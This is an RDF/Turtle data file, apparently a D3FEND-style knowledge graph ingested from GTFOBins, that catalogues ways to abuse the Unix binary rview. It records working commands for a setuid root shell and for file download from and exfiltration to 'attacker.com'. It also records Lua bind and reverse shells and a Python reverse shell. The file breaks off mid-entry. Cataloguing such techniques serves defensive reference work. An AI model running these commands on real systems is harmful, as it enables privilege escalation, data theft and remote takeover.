mknd:command_rview-capabilities a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-capabilities" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_capabilities ;
    mknd:value "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'" .

mknd:command_rview-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
        "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export LPORT=12345
export LFILE=file_to_save
rview -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
""",
        """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
""" .

mknd:command_rview-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_file-read ;
    mknd:value "rview file_to_read" .

mknd:command_rview-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
        "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export LPORT=8888
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rview -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
""",
        """export URL=http://attacker.com/
export LFILE=file_to_send
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
""" .

mknd:command_rview-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_file-write ;
    mknd:value """rview file_to_write
iDATA
^[
w!
""" .

mknd:command_rview-library-load a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-library-load" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_library-load ;
    mknd:value "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'" .

mknd:command_rview-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `rview` is compiled with Lua support." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value "./rview -c ':lua os.execute(\"reset; exec sh\")'" .

mknd:command_rview-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """export LPORT=12345
rview -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
""" .

mknd:command_rview-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
rview -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
""" .

mknd:command_rview-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "rview-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_rview ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_rview ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
""" .

mknd:command_rview-shell a d3f:Command,
